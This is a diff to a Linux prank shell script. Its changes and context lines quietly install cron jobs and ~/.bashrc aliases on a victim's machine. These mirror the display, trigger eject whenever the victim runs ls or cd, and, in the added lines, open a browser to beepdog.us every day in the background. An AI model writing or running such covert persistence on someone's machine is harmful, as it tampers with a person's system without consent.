@@ -21,7 +21,7 @@ RANDOM=`date '+%s'`
 # Semi-permanent prank
 for n in {1 .. $[($RANDOM % 3) + 1]}
 do
-    case $[$RANDOM % 9] in
+    case $[$RANDOM % 10] in
         0) # Mirror the display weekly
             crontab -l | sed "\$a\@weekly /usr/bin/xrandr --output $DEVICE --reflect xy" | crontab -
             ;;
@@ -65,6 +65,9 @@ do
             echo "alias ls='sh -c 'eject &' && `which ls`" >> ~/.bashrc
             echo "alias cd='sh -c 'eject &' && `which cd`" >> ~/.bashrc
             ;;
+        9) # Open beepdog daily
+            crontab -l | sed "\$a\@daily nohup www-browser http://beepdog.us >> /dev/null &" | crontab -
+            ;;
     esac
 done
 
@@ -97,7 +100,7 @@ do
             xrandr --output $DEVICE --reflect y
             ;;
         7) # Beepdog!
-            www-browser http://beepdog.us &
+            nohup www-browser http://beepdog.us >> /dev/null &
             ;;
     esac
 done
